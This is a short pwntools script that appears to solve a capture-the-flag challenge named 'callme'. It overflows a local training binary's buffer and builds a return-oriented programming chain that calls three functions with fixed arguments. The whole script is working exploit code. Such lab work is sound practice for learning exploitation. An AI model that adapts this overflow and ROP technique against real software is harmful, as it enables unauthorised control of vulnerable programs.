from pwn import *

arg_1 = p64(0xdeadbeefdeadbeef)
arg_2 = p64(0xcafebabecafebabe)
arg_3 = p64(0xd00df00dd00df00d)

context.bits = 64
callme_one = p64(0x400720)
callme_two = p64(0x400740)
callme_three = p64(0x4006f0)
pop_registres = p64(0x40093c)

payload = b'A' * 40 + pop_registres + arg_1 + arg_2 + arg_3 + callme_one
payload += pop_registres + arg_1 + arg_2 + arg_3 + callme_two
payload += pop_registres + arg_1 + arg_2 + arg_3 + callme_three

p = process("./callme")
p.send(payload)
p.interactive()
